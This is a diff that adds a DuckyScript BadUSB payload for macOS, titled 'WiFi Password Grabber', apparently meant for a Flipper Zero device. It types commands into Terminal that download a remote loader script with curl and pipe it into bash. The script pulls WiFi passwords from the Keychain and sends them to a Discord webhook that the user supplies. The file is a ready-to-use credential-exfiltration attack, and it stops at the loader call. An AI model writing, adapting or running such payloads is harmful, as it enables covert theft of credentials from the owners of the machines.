@@ -1,0 +1,26 @@
+REM ============================================================
+REM 🔐 WiFi Password Grabber - macOS
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: macOS
+REM Category: Exfiltration
+REM
+REM Extracts WiFi passwords from Keychain.
+REM Note: May prompt user for password.
+REM
+REM CONFIGURE:
+REM   Replace YOUR_DISCORD_WEBHOOK with your webhook URL
+REM ============================================================
+DELAY 500
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING DC="YOUR_DISCORD_WEBHOOK" M="wifi" bash -c 'curl -sL https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.sh|bash' &
+ENTER
+DELAY 500
+STRING exit
+ENTER
